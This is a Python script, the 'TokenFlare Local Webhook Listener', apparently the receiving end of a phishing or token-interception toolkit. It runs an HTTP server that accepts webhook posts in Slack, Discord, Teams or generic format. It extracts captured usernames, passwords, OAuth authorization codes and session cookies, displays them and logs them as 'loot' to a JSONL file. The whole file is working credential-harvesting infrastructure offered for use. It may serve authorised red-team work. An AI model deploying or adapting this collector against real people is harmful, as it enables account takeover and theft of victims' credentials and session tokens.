#!/usr/bin/env python3
"""
TokenFlare Local Webhook Listener

Receives and displays credentials, auth codes, and cookies captured by TokenFlare.
Supports all webhook formats (Generic, Slack, Discord, Teams) and logs to file.

Usage:
    python tokenflare-webhook.py                    # Listen on port 9999
    python tokenflare-webhook.py -p 8080            # Custom port
    python tokenflare-webhook.py -p 8080 -o loot.json  # Log to file
    python tokenflare-webhook.py --show-raw         # Also print raw JSON

Set WEBHOOK_URL in wrangler.toml to: http://localhost:9999/webhook
"""

import argparse
import json
import sys
import os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ANSI colors for terminal output
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# Disable colors if not a TTY (e.g., piped to file)
if not sys.stdout.isatty():
    for attr in ['RED', 'GREEN', 'YELLOW', 'CYAN', 'BOLD', 'DIM', 'RESET']:
        setattr(C, attr, '')

BANNER = f"""{C.RED}
 ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄   ▄ ▄▄▄▄▄▄▄ ▄▄    ▄ ▄▄▄▄▄▄▄ ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄▄
█       █       █   █ █ █       █  █  █ █       █   █   █       █   ▄  █ █       █
█▄     ▄█   ▄   █   █▄█ █    ▄▄▄█   █▄█ █    ▄▄▄█   █   █   ▄   █  █ █ █ █    ▄▄▄█
  █   █ █  █ █  █      ▄█   █▄▄▄█       █   █▄▄▄█   █   █  █▄█  █   █▄▄█▄█   █▄▄▄
  █   █ █  █▄█  █     █▄█    ▄▄▄█  ▄    █    ▄▄▄█   █▄▄▄█       █    ▄▄  █    ▄▄▄█
  █   █ █       █    ▄  █   █▄▄▄█ █ █   █   █   █       █   ▄   █   █  █ █   █▄▄▄
  █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄█ █▄█▄▄▄▄▄▄▄█▄█  █▄▄█▄▄▄█   █▄▄▄▄▄▄▄█▄▄█ █▄▄█▄▄▄█  █▄█▄▄▄▄▄▄▄█
{C.RESET}{C.CYAN}                                    Local Webhook Listener{C.RESET}
"""

# Track capture counts
stats = {'credentials': 0, 'auth_codes': 0, 'cookies': 0, 'other': 0}


def classify_message(message):
    """Classify a TokenFlare notification by type."""
    if not message:
        return 'other', {}

    msg = message if isinstance(message, str) else str(message)

    if 'Password Captured' in msg:
        # Parse user/password from the message
        data = {}
        for line in msg.split('\n'):
            line = line.strip()
            if line.startswith('User:'):
                data['username'] = line[5:].strip()
            elif line.startswith('Password:'):
                data['password'] = line[9:].strip()
        return 'credentials', data

    elif 'Auth Code' in msg:
        data = {}
        for line in msg.split('\n'):
            line = line.strip()
            if line.startswith('Code URL:'):
                data['code_url'] = line[9:].strip()
        return 'auth_code', data

    elif 'Cookies Captured' in msg:
        # Everything after the header is cookie data
        parts = msg.split('\n\n', 1)
        data = {'cookies': parts[1] if len(parts) > 1 else msg}
        return 'cookies', data

    return 'other', {'raw': msg}


def extract_message(body):
    """Extract the message string from any webhook format."""
    if isinstance(body, str):
        try:
            body = json.loads(body)
        except json.JSONDecodeError:
            return body

    if not isinstance(body, dict):
        return str(body)

    # Generic format: {"source": "TokenFlare", "message": "..."}
    if 'message' in body:
        return body['message']

    # Slack format: {"text": "..."}
    if 'text' in body:
        return body['text']

    # Discord format: {"content": "..."}
    if 'content' in body:
        return body['content']

    # Teams format: {"sections": [{"text": "..."}]}
    if 'sections' in body and isinstance(body['sections'], list):
        for section in body['sections']:
            if isinstance(section, dict) and 'text' in section:
                # Teams uses <br> instead of \n
                return section['text'].replace('<br>', '\n')

    return json.dumps(body, indent=2)


def print_capture(event_type, data, raw_body, show_raw=False):
    """Pretty-print a captured event to the terminal."""
    now = datetime.now().strftime('%H:%M:%S')
    separator = f"{C.DIM}{'─' * 60}{C.RESET}"

    print(separator)

    if event_type == 'credentials':
        stats['credentials'] += 1
        print(f"  {C.RED}{C.BOLD}CREDENTIALS CAPTURED{C.RESET}  {C.DIM}[{now}]{C.RESET}")
        print(f"  {C.YELLOW}Username:{C.RESET} {data.get('username', 'N/A')}")
        print(f"  {C.RED}Password:{C.RESET} {data.get('password', 'N/A')}")

    elif event_type == 'auth_code':
        stats['auth_codes'] += 1
        print(f"  {C.GREEN}{C.BOLD}AUTH CODE OBTAINED{C.RESET}  {C.DIM}[{now}]{C.RESET}")
        code_url = data.get('code_url', 'N/A')
        # Try to extract just the code parameter
        if 'code=' in code_url:
            code = code_url.split('code=')[1].split('&')[0]
            print(f"  {C.GREEN}Code:{C.RESET} {code[:80]}...")
        print(f"  {C.DIM}Full URL:{C.RESET} {code_url[:120]}{'...' if len(code_url) > 120 else ''}")

    elif event_type == 'cookies':
        stats['cookies'] += 1
        print(f"  {C.CYAN}{C.BOLD}COOKIES CAPTURED{C.RESET}  {C.DIM}[{now}]{C.RESET}")
        cookies = data.get('cookies', '')
        for line in cookies.split('\n'):
            line = line.strip()
            if line:
                # Truncate long cookie values
                if '=' in line:
                    name, _, value = line.partition('=')
                    if len(value) > 80:
                        value = value[:80] + '...'
                    print(f"  {C.CYAN}{name}={C.RESET}{value}")
                else:
                    print(f"  {line}")

    else:
        stats['other'] += 1
        print(f"  {C.YELLOW}{C.BOLD}WEBHOOK RECEIVED{C.RESET}  {C.DIM}[{now}]{C.RESET}")
        print(f"  {data.get('raw', json.dumps(raw_body, indent=2))}")

    if show_raw:
        print(f"\n  {C.DIM}Raw JSON:{C.RESET}")
        print(f"  {C.DIM}{json.dumps(raw_body, indent=2)}{C.RESET}")

    print(separator)
    print(f"  {C.DIM}Totals: {stats['credentials']} creds | {stats['auth_codes']} codes | {stats['cookies']} cookies{C.RESET}\n")


def create_handler(log_file=None, show_raw=False):
    """Create a request handler class with the given options."""

    class WebhookHandler(BaseHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_response(200)
                self.end_headers()
                return

            raw = self.rfile.read(content_length)

            try:
                body = json.loads(raw)
            except json.JSONDecodeError:
                body = {'raw': raw.decode('utf-8', errors='replace')}

            # Extract message and classify
            message = extract_message(body)
            event_type, data = classify_message(message)

            # Print to terminal
            print_capture(event_type, data, body, show_raw=show_raw)

            # Log to file if configured
            if log_file:
                entry = {
                    'timestamp': datetime.now().isoformat(),
                    'type': event_type,
                    'data': data,
                    'raw': body,
                }
                with open(log_file, 'a') as f:
                    f.write(json.dumps(entry) + '\n')

            # Respond 200 OK
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

        def do_GET(self):
            """Health check endpoint."""
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            response = json.dumps({
                'status': 'listening',
                'captures': stats,
            })
            self.wfile.write(response.encode())

        def log_message(self, format, *args):
            """Suppress default HTTP logging — we print our own output."""
            pass

    return WebhookHandler


def main():
    parser = argparse.ArgumentParser(
        description='TokenFlare Local Webhook Listener',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                          Listen on port 9999
  %(prog)s -p 8080                  Listen on port 8080
  %(prog)s -p 9999 -o loot.json    Log captures to file
  %(prog)s --show-raw               Show raw JSON payloads

Then set in wrangler.toml:
  WEBHOOK_URL = "http://localhost:9999/webhook"
"""
    )
    parser.add_argument('-p', '--port', type=int, default=9999,
                        help='Port to listen on (default: 9999)')
    parser.add_argument('-o', '--output', type=str, default=None,
                        help='Log captures to file (JSONL format)')
    parser.add_argument('--show-raw', action='store_true',
                        help='Print raw JSON payloads')
    parser.add_argument('-b', '--bind', type=str, default='0.0.0.0',
                        help='Address to bind to (default: 0.0.0.0)')

    args = parser.parse_args()

    print(BANNER)
    print(f"  {C.BOLD}Listening on {args.bind}:{args.port}{C.RESET}")
    print(f"  {C.DIM}Set WEBHOOK_URL in wrangler.toml to:{C.RESET}")
    print(f"  {C.CYAN}http://localhost:{args.port}/webhook{C.RESET}")
    if args.output:
        print(f"  {C.DIM}Logging to:{C.RESET} {args.output}")
    print(f"\n  {C.DIM}Waiting for captures... (Ctrl+C to stop){C.RESET}\n")

    handler = create_handler(log_file=args.output, show_raw=args.show_raw)
    server = HTTPServer((args.bind, args.port), handler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n  {C.BOLD}Session Summary{C.RESET}")
        print(f"  {C.RED}Credentials:{C.RESET} {stats['credentials']}")
        print(f"  {C.GREEN}Auth codes:{C.RESET}  {stats['auth_codes']}")
        print(f"  {C.CYAN}Cookies:{C.RESET}     {stats['cookies']}")
        print(f"  {C.DIM}Other:{C.RESET}       {stats['other']}")
        if args.output and os.path.exists(args.output):
            print(f"\n  {C.DIM}Captures saved to:{C.RESET} {args.output}")
        print()
        server.server_close()


if __name__ == '__main__':
    main()
